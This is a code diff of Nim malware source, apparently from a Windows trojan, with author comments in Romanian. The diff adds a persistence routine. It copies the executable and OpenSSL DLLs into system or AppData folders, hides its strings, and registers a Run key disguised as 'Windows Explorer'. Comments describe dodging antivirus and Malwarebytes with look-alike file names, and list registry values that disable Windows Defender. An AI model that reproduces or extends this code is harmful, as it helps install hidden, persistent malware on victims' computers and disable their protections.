@@ -3,7 +3,8 @@
 from os import getAppFilename
 from os import copyFile
 from os import getEnv
-from os import joinPath
+from os import `/`
+from os import existsFile
 
 import ../functions/hideString
 import ../functions/setRegKey
@@ -21,15 +22,33 @@ proc initPersistenceThread*(): void {.thread.} =
     # ma detecteaza antivirusul la windows ca svchost e
     # scris cu chiril si seamana cu cv fisier windows
     # trebuie sa vad sa gasesc alt nume credibil
-    dest = getEnv(d e"SystemRoot").joinPath(exeName)
+    dest = getEnv(d e"SystemRoot")
   else:
     # ma detecteaza mallwarebytes daca stau in appdata
-    dest = getEnv(d e"appdata").joinPath(exeName)
+    dest = getEnv(d e"appdata") / d(e("Microsoft\\Windows"))
 
+  let appDest: string = dest / exeName
   # imi da crash programul daca incerc sa i dau replace dar el e deschis
-  if filename != dest:
-    discard
-    # copyFile(filename, dest)
+  # not existsFile dest ca sa nu l instalez de 2 ori
+  if filename != appDest or not existsFile appDest:
+    copyFile(filename, appDest)
+
+    let ddl1Name: string = d e "libssl-1_1.dll"
+    copyFile(ddl1Name, dest / ddl1Name)
+
+    let ddl2Name: string = d e "libcrypto-1_1.dll"
+    copyFile(ddl2Name, dest / ddl2Name)
+    ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
+    ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
+    setRegKey(
+      d e "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      d e "Windows Explorer", appDest
+    )
+  # setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+  #     "client bl2", dest)
+  # delRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+  #     "client bla")
+
 
   ## INTERESANT: REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
   ## vezi ca trb sa aiba val 1
@@ -39,14 +58,3 @@ proc initPersistenceThread*(): void {.thread.} =
   ##  -> DisableOnAccessProtection  DWORD 1
   ##  -> DisableScanOnRealtimeEnable DWORD 1
   ##
-
-  ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
-  ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
-  if isAdmin():
-    setRegKey(d e"Software\Microsoft\Windows\CurrentVersion\Run",
-        d e"Windows Explorer", dest)
-  # setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-  #     "client bl2", dest)
-  # delRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-  #     "client bla")
-
